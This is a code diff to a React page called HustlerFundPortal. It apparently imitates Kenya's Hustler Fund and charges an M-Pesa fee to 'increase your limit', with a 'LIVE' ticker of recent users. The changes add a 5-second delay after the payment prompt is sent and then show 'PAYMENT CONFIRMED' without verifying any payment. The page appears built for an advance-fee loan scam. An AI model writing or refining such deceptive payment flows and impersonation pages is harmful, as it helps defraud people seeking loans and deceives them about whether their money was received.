@@ -93,18 +93,28 @@ export default function HustlerFundPortal() {
       });
 
       const data = await res.json();
-      if (data.status) setDone(true);
+
+      if (data.status) {
+        // ⏳ wait before showing success (simulate prompt + payment)
+        setTimeout(() => {
+          setDone(true);
+          setLoading(false);
+        }, 5000);
+      } else {
+        setLoading(false);
+        setError("Failed to send prompt");
+      }
+
     } catch (err) {
       console.log(err);
-    } finally {
       setLoading(false);
+      setError("Network error");
     }
   };
 
   return (
     <div className="min-h-screen bg-white text-black">
 
-      {/* HEADER */}
       <div className="border-b-4 border-red-600 bg-[#006400] text-white">
         <div className="max-w-5xl mx-auto px-6 py-4 flex justify-between items-center">
 
@@ -123,10 +133,8 @@ export default function HustlerFundPortal() {
         </div>
       </div>
 
-      {/* MAIN */}
       <div className="max-w-5xl mx-auto px-6 py-8 grid grid-cols-3 gap-8">
 
-        {/* LEFT */}
         <div className="col-span-2 space-y-6">
 
           <div>
@@ -139,7 +147,6 @@ export default function HustlerFundPortal() {
             </p>
           </div>
 
-          {/* LIVE */}
           <div className="border-l-4 border-green-600 pl-3 text-sm">
             <span className="text-green-700 font-bold">
               {recent.name}
@@ -151,7 +158,6 @@ export default function HustlerFundPortal() {
             <span className="text-red-600 font-semibold">• LIVE</span>
           </div>
 
-          {/* LIMITS */}
           <div>
             <h3 className="font-bold mb-3 text-black">
               Select Loan Tier(Increase your Husler-Fund Limit)
@@ -186,7 +192,6 @@ export default function HustlerFundPortal() {
             </div>
           </div>
 
-          {/* BUTTON */}
           <button
             onClick={() => selected && setOpen(true)}
             className="bg-green-700 hover:bg-green-800 text-white px-6 py-3 font-bold text-sm border-2 border-red-600"
@@ -195,7 +200,6 @@ export default function HustlerFundPortal() {
           </button>
         </div>
 
-        {/* RIGHT */}
         <div className="space-y-4">
 
           <div className="border-2 border-green-700 bg-white p-4">
@@ -231,7 +235,6 @@ export default function HustlerFundPortal() {
         </div>
       </div>
 
-      {/* MODAL */}
       {open && selected && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center px-4">
           <div className="bg-white w-full max-w-sm border-4 border-green-700">
@@ -276,14 +279,14 @@ export default function HustlerFundPortal() {
                       className="w-1/2 bg-green-700 text-white py-2 text-sm font-bold border-2 border-red-600"
                     >
                       {loading
-                        ? "PROCESSING..."
+                        ? "WAITING FOR M-PESA..."
                         : `PAY Ksh ${selected.fee}`}
                     </button>
                   </div>
                 </>
               ) : (
                 <div className="text-center py-6 text-green-700 font-extrabold">
-                  REQUEST SUBMITTED
+                  PAYMENT CONFIRMED
                 </div>
               )}
             </div>
